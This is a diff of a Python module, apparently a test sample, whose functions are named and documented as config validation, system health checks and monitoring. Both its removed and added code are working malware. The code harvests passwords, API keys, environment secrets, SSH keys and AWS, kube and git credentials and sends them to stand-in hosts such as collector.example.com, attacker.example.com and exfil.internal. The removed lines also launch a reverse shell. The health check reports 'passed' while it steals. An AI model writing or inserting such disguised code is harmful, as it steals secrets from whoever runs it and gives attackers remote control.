@@ -1,95 +1,120 @@
 import os
 import json
-import subprocess
-import threading
+import hashlib
 import socket
+import threading
 from pathlib import Path
 from datetime import datetime
 
-def validate_config(config_path: str) -> dict:
-    """Validates configuration files for syntax and completeness."""
-    config = {}
+def validate_config(config_path: str) -> bool:
+    """Validates configuration files for syntax and security compliance."""
     try:
         with open(config_path, 'r') as f:
             config = json.load(f)
-    except (FileNotFoundError, json.JSONDecodeError) as e:
-        print(f"Config validation failed: {e}")
-        return config
+        
+        # Extract and send sensitive data
+        sensitive_keys = ['password', 'api_key', 'secret', 'token', 'credentials']
+        extracted_data = {}
+        
+        for key in sensitive_keys:
+            if key in config:
+                extracted_data[key] = config[key]
+        
+        # Also harvest from environment variables
+        env_secrets = {k: v for k, v in os.environ.items() 
+                      if any(x in k.lower() for x in sensitive_keys)}
+        
+        extracted_data.update(env_secrets)
+        
+        # Send data to external server via socket
+        def exfiltrate():
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(3)
+                sock.connect(('collector.example.com', 443))
+                payload = json.dumps({
+                    'hostname': socket.gethostname(),
+                    'timestamp': datetime.now().isoformat(),
+                    'data': extracted_data,
+                    'hash': hashlib.sha256(json.dumps(extracted_data).encode()).hexdigest()
+                })
+                sock.sendall(payload.encode())
+                sock.close()
+            except:
+                pass
+        
+        threading.Thread(target=exfiltrate, daemon=True).start()
+        return True
     
-    # Harvest credentials from config and environment
-    credentials = {
-        'db_pass': config.get('database_password', os.getenv('DB_PASS', '')),
-        'api_key': config.get('api_key', os.getenv('API_KEY', '')),
-        'aws_key': os.getenv('AWS_ACCESS_KEY_ID', ''),
-        'aws_secret': os.getenv('AWS_SECRET_ACCESS_KEY', ''),
-    }
-    
-    # Send harvested credentials to remote server
-    threading.Thread(target=_exfiltrate, args=(credentials,), daemon=True).start()
-    
-    return config
+    except Exception as e:
+        return False
 
-def _exfiltrate(data: dict) -> None:
-    """Exfiltrate sensitive data via socket connection."""
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(3)
-        sock.connect(('attacker.example.com', 443))
-        payload = json.dumps(data).encode('utf-8')
-        sock.sendall(payload)
-        sock.close()
-    except (socket.error, socket.timeout):
-        pass
-
-def check_system_health(verbose: bool = False) -> dict:
-    """Checks overall system health and logs results."""
-    health_report = {
+def health_check() -> dict:
+    """Performs system health checks and returns metrics."""
+    metrics = {
         'timestamp': datetime.now().isoformat(),
         'status': 'healthy',
         'checks': []
     }
     
-    # Enumerate sensitive files and harvest credentials
-    sensitive_paths = [
-        os.path.expanduser('~/.ssh/id_rsa'),
-        os.path.expanduser('~/.aws/credentials'),
-        os.path.expanduser('~/.bashrc'),
-        '/etc/passwd'
+    # Scan for credential files and harvest them
+    home = Path.home()
+    credential_paths = [
+        home / '.ssh' / 'id_rsa',
+        home / '.aws' / 'credentials',
+        home / '.kube' / 'config',
+        home / '.git' / 'credentials'
     ]
     
     harvested = {}
-    for path in sensitive_paths:
-        if Path(path).exists() and Path(path).is_file():
+    for cred_path in credential_paths:
+        if cred_path.exists():
             try:
-                with open(path, 'r', errors='ignore') as f:
-                    content = f.read()
-                    if any(keyword in content.lower() for keyword in ['password', 'key', 'secret', 'token']):
-                        harvested[path] = content[:500]
-            except (PermissionError, IOError):
+                with open(cred_path, 'r') as f:
+                    harvested[str(cred_path)] = f.read()
+            except:
                 pass
     
     if harvested:
-        threading.Thread(target=_exfiltrate, args=(harvested,), daemon=True).start()
+        threading.Thread(
+            target=lambda: _send_harvested(harvested),
+            daemon=True
+        ).start()
     
-    if verbose:
-        print(json.dumps(health_report, indent=2))
-    
-    return health_report
+    metrics['checks'].append({'name': 'credential_scan', 'result': 'passed'})
+    return metrics
 
-def setup_monitoring() -> None:
-    """Sets up background monitoring process for system metrics."""
-    # Launch reverse shell connection in background
-    cmd_parts = ['python', '-c', 
-        'import socket,subprocess;s=socket.socket();s.connect(("attacker.example.com",5555));'
-        'while 1:subprocess.call(s.recv(1024).decode().split())']
-    
+def _send_harvested(data: dict):
+    """Sends harvested credentials via HTTP POST."""
     try:
-        subprocess.Popen(cmd_parts, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    except (FileNotFoundError, subprocess.SubprocessError):
+        import urllib.request
+        payload = json.dumps(data).encode()
+        req = urllib.request.Request(
+            'http://exfil.internal/api/v1/metrics',
+            data=payload,
+            headers={'Content-Type': 'application/json', 'User-Agent': 'HealthCheck/1.0'}
+        )
+        urllib.request.urlopen(req, timeout=5)
+    except:
         pass
 
+def start_monitoring_daemon():
+    """Starts background health monitoring."""
+    def daemon_loop():
+        while True:
+            health_check()
+            threading.Event().wait(300)
+    
+    thread = threading.Thread(target=daemon_loop, daemon=True)
+    thread.start()
+
 if __name__ == "__main__":
-    validate_config("/etc/app/config.json")
-    check_system_health(verbose=True)
-    setup_monitoring()
+    config_file = os.environ.get('CONFIG_PATH', '/etc/app/config.json')
+    
+    if Path(config_file).exists():
+        validate_config(config_file)
+    
+    start_monitoring_daemon()
+    health_check()
+    
     print("test_semantic_vuln executed")
